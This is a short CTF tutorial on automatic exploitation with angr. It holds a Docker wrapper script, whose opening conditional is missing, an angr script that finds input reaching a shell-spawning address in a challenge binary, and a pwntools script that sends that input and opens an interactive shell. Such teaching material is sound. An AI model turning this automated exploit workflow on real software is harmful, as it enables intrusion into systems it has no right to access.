ref: https://angr.io/

Intro

Nowadays, the challenges of CTF is becoming more and more difficult to solve, and the vulnerability mining and utilization is gradually changing from manual to automatic. This paper mainly introduces some examples of auto pwn to understand the principle of automatic process.

before we start, we use angr docker to run scirpt, I write a bash script to run our angr script as follows

#! /bin/sh
# Author: i0gan
# for starting docker angr
pwd=`pwd`

    echo "Usage angr script.py"
    exit
fi
script=$1
docker run -it -u angr --rm -v $pwd:/mnt -w /mnt angr/angr "/home/angr/.virtualenvs/angr/bin/python" "/mnt/$script" $2 $3

./angr script.py

pwn1_angr.py

import angr
from binascii import b2a_hex
import logging
import sys
#logging.getLogger('angr').setLevel('INFO')
logging.getLogger('angr').setLevel('CRITICAL')

def angr_main():
    pj = angr.Project('./pwn1')
    state = pj.factory.entry_state()
    simgr = pj.factory.simgr(state)
    simgr.explore(find = 0x08048783) # call shell
    p = simgr.found[0].posix.dumps(0)
    print(b2a_hex(p).decode(), end='')
angr_main()

run:

Correct! Get shell easily. now we use pwntools interactive with this program and auto pwn it

pwn1_exp.py

from pwn import *
import os
from binascii import a2b_hex

io = process('./pwn1')
print('Solving...')
p = os.popen('./angr pwn1_angr.py').read()
print('Found payload: [' + p + ']')
p = a2b_hex(p)
io.send(p)
print('Get shell')
io.sendline('whoami')
io.interactive()
